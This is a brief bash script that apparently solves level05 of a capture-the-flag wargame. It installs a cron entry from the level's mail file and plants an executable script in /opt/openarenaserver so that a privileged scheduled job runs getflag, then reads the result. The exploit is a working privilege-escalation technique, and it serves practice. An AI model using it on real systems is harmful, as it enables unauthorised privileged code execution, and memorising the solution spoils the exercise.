#!/bin/bash

# 1. Add the job into crontab from mail
(crontab -l ; cat /var/mail/level05)| crontab -

# 2. Create the script that will execute getflag
echo "getflag > /tmp/flag05" > /opt/openarenaserver/script
chmod +x /opt/openarenaserver/script

# 3. Display the output of getflag,
# 2 minutes after according to the cron job schedule
echo "Waiting for 'getflag' output...\n\n"
sleep 2m && cat /tmp/flag05